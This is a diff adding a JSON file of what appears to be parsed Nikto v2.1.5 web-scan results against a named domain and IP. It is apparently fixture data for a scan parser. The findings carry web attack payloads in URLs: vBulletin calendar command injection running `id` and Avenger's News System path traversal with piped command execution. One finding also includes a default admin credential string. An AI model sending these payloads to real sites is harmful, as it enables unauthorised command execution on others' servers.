@@ -1,0 +1,225 @@
+[
+    [{
+        "_id": 105159496356758366987799399689076018653,
+        "_type": "ip",
+        "_tool": "Nikto - v2.1.5",
+        "ip": "165.227.229.13"
+    }],
+    [{
+        "_id": 105159496356758366987799399689076018653,
+        "_type": "ip",
+        "_tool": "Nikto - v2.1.5",
+        "ip": "165.227.229.13"
+    }, {
+        "_id": 234178383456962832062899267090530450235,
+        "_type": "port",
+        "_tool": "Nikto - v2.1.5",
+        "port": "443"
+    }],
+    [{
+        "_id": 105159496356758366987799399689076018653,
+        "_type": "ip",
+        "_tool": "Nikto - v2.1.5",
+        "ip": "165.227.229.13"
+    }, {
+        "_id": 234178383456962832062899267090530450235,
+        "_type": "port",
+        "_tool": "Nikto - v2.1.5",
+        "port": "443"
+    }, {
+        "_id": 6961524138983905150532838139651034395,
+        "_type": "banner",
+        "_tool": "Nikto - v2.1.5",
+        "banner": "Microsoft-IIS/8.5"
+    }],
+    [{
+        "_id": 247914015633226009395543681302298559506,
+        "_type": "domain",
+        "_tool": "Nikto - v2.1.5",
+        "domain": "sueldonetoautonomo.es"
+    }],
+    [{
+        "_id": 247914015633226009395543681302298559506,
+        "_type": "domain",
+        "_tool": "Nikto - v2.1.5",
+        "domain": "sueldonetoautonomo.es"
+    }, {
+        "_id": 234178383456962832062899267090530450235,
+        "_type": "port",
+        "_tool": "Nikto - v2.1.5",
+        "port": "443"
+    }],
+    [{
+        "_id": 247914015633226009395543681302298559506,
+        "_type": "domain",
+        "_tool": "Nikto - v2.1.5",
+        "domain": "sueldonetoautonomo.es"
+    }, {
+        "_id": 234178383456962832062899267090530450235,
+        "_type": "port",
+        "_tool": "Nikto - v2.1.5",
+        "port": "443"
+    }, {
+        "_id": 6961524138983905150532838139651034395,
+        "_type": "banner",
+        "_tool": "Nikto - v2.1.5",
+        "banner": "Microsoft-IIS/8.5"
+    }],
+    [{
+        "_id": 46550547684566482499660732518663113159,
+        "_type": "url",
+        "_tool": "Nikto - v2.1.5",
+        "url": "https://sueldonetoautonomo.es/"
+    }],
+    [{
+        "_id": 192538130894483201199582516875759289790,
+        "_type": "url",
+        "_tool": "Nikto - v2.1.5",
+        "url": "https://sueldonetoautonomo.es/css"
+    }],
+    [{
+        "_id": 123102750584062630268477766173993921039,
+        "_type": "url",
+        "_tool": "Nikto - v2.1.5",
+        "url": "https://sueldonetoautonomo.es/img/"
+    }],
+    [{
+        "_id": 285645167741746374852020582202106457226,
+        "_type": "url",
+        "_tool": "Nikto - v2.1.5",
+        "url": "https://sueldonetoautonomo.es/js"
+    }],
+    [{
+        "_id": 322168664758111497073717164846564122947,
+        "_type": "url",
+        "_tool": "Nikto - v2.1.5",
+        "url": "https://sueldonetoautonomo.es/forumscalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22"
+    }],
+    [{
+        "_id": 322168664758111497073717164846564122947,
+        "_type": "url",
+        "_tool": "Nikto - v2.1.5",
+        "url": "https://sueldonetoautonomo.es/forumscalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22"
+    }, {
+        "title": "Web application vulnerability",
+        "description": "/forumscalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: Vbulletin allows remote command execution. See http://www.securiteam.com/securitynews/5IP0B203PI.html",
+        "url": "https://sueldonetoautonomo.es/forumscalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22",
+        "_type": "vulnerability",
+        "_tool": "Nikto - v2.1.5",
+        "_id": 90509557856291229160563043561784651049
+    }],
+    [{
+        "_id": 63416191301250883872138942964939814095,
+        "_type": "url",
+        "_tool": "Nikto - v2.1.5",
+        "url": "https://sueldonetoautonomo.es/forumzcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22"
+    }],
+    [{
+        "_id": 63416191301250883872138942964939814095,
+        "_type": "url",
+        "_tool": "Nikto - v2.1.5",
+        "url": "https://sueldonetoautonomo.es/forumzcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22"
+    }, {
+        "title": "Web application vulnerability",
+        "description": "/forumzcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: Vbulletin allows remote command execution. See http://www.securiteam.com/securitynews/5IP0B203PI.html",
+        "url": "https://sueldonetoautonomo.es/forumzcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22",
+        "_type": "vulnerability",
+        "_tool": "Nikto - v2.1.5",
+        "_id": 21318587969684553701445810281487806206
+    }],
+    [{
+        "_id": 124133232355854915330015877853409149961,
+        "_type": "url",
+        "_tool": "Nikto - v2.1.5",
+        "url": "https://sueldonetoautonomo.es/htforumcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22"
+    }],
+    [{
+        "_id": 124133232355854915330015877853409149961,
+        "_type": "url",
+        "_tool": "Nikto - v2.1.5",
+        "url": "https://sueldonetoautonomo.es/htforumcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22"
+    }, {
+        "title": "Web application vulnerability",
+        "description": "/htforumcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: Vbulletin allows remote command execution. See http://www.securiteam.com/securitynews/5IP0B203PI.html",
+        "url": "https://sueldonetoautonomo.es/htforumcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22",
+        "_type": "vulnerability",
+        "_tool": "Nikto - v2.1.5",
+        "_id": 91011496538951651043302184315135030088
+    }],
+    [{
+        "_id": 304856384239053571910572149325615539425,
+        "_type": "url",
+        "_tool": "Nikto - v2.1.5",
+        "url": "https://sueldonetoautonomo.es/vbcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22"
+    }],
+    [{
+        "_id": 304856384239053571910572149325615539425,
+        "_type": "url",
+        "_tool": "Nikto - v2.1.5",
+        "url": "https://sueldonetoautonomo.es/vbcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22"
+    }, {
+        "title": "Web application vulnerability",
+        "description": "/vbcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: Vbulletin allows remote command execution. See http://www.securiteam.com/securitynews/5IP0B203PI.html",
+        "url": "https://sueldonetoautonomo.es/vbcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22",
+        "_type": "vulnerability",
+        "_tool": "Nikto - v2.1.5",
+        "_id": 220279075736313165331307031005386231912
+    }],
+    [{
+        "_id": 111952047078222581007251004496734312383,
+        "_type": "url",
+        "_tool": "Nikto - v2.1.5",
+        "url": "https://sueldonetoautonomo.es/vbulletincalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22"
+    }],
+    [{
+        "_id": 111952047078222581007251004496734312383,
+        "_type": "url",
+        "_tool": "Nikto - v2.1.5",
+        "url": "https://sueldonetoautonomo.es/vbulletincalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22"
+    }, {
+        "title": "Web application vulnerability",
+        "description": "/vbulletincalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: Vbulletin allows remote command execution. See http://www.securiteam.com/securitynews/5IP0B203PI.html",
+        "url": "https://sueldonetoautonomo.es/vbulletincalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22",
+        "_type": "vulnerability",
+        "_tool": "Nikto - v2.1.5",
+        "_id": 52218605684294621990920808301612497164
+    }],
+    [{
+        "_id": 291430623684062620225470994651710820304,
+        "_type": "url",
+        "_tool": "Nikto - v2.1.5",
+        "url": "https://sueldonetoautonomo.es/ans.pl?p=../../../../../usr/bin/id|&blah"
+    }],
+    [{
+        "_id": 291430623684062620225470994651710820304,
+        "_type": "url",
+        "_tool": "Nikto - v2.1.5",
+        "url": "https://sueldonetoautonomo.es/ans.pl?p=../../../../../usr/bin/id|&blah"
+    }, {
+        "title": "Web application vulnerability",
+        "description": "/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.  http://ans.gq.nu/ default admin string 'admin:aaLR8vE.jjhss:root@127.0.0.1', password file location 'ans_data/ans.passwd'",
+        "url": "https://sueldonetoautonomo.es/ans.pl?p=../../../../../usr/bin/id|&blah",
+        "_type": "vulnerability",
+        "_tool": "Nikto - v2.1.5",
+        "_id": 180078879200378215365323665430433375111
+    }],
+    [{
+        "_id": 69008390951787397982382691976239609950,
+        "_type": "url",
+        "_tool": "Nikto - v2.1.5",
+        "url": "https://sueldonetoautonomo.es/ans/ans.pl?p=../../../../../usr/bin/id|&blah"
+    }],
+    [{
+        "_id": 69008390951787397982382691976239609950,
+        "_type": "url",
+        "_tool": "Nikto - v2.1.5",
+        "url": "https://sueldonetoautonomo.es/ans/ans.pl?p=../../../../../usr/bin/id|&blah"
+    }, {
+        "title": "Web application vulnerability",
+        "description": "/ans/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.",
+        "url": "https://sueldonetoautonomo.es/ans/ans.pl?p=../../../../../usr/bin/id|&blah",
+        "_type": "vulnerability",
+        "_tool": "Nikto - v2.1.5",
+        "_id": 327000872263356983237318540680926013703
+    }]
+]
